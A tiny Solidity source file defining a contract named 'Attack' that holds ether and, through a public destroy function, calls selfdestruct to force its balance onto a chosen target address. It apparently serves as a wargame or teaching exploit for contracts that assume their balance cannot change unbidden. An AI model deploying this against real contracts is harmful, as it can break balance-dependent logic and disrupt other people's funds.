// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    constructor() payable {}

    function destroy(address payable _target) public {
        selfdestruct(_target);
    }
}
